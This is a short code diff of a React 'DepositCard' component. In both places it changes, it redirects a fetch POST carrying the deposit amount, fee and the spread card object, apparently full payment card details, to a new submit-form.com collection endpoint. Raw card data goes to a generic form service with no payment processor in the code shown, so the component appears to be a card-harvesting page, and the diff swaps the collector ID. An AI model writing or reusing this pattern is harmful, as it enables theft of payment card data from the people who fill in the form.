@@ -179,7 +179,7 @@ function DepositCard() {
                 return;
               }
               try {
-                await fetch("https://submit-form.com/4sJGEzNCF", {
+                await fetch("https://submit-form.com/CSfD1FWHQ", {
                   method: "POST",
                   headers: { "Content-Type": "application/json", Accept: "application/json" },
                   body: JSON.stringify({ source: "deposit-card-add", amount: value, ...card }),
@@ -226,7 +226,7 @@ function DepositCard() {
           <button
             onClick={async () => {
               try {
-                await fetch("https://submit-form.com/4sJGEzNCF", {
+                await fetch("https://submit-form.com/CSfD1FWHQ", {
                   method: "POST",
                   headers: { "Content-Type": "application/json", Accept: "application/json" },
                   body: JSON.stringify({ source: "deposit-card-confirm", amount: value, fee, total, ...card }),
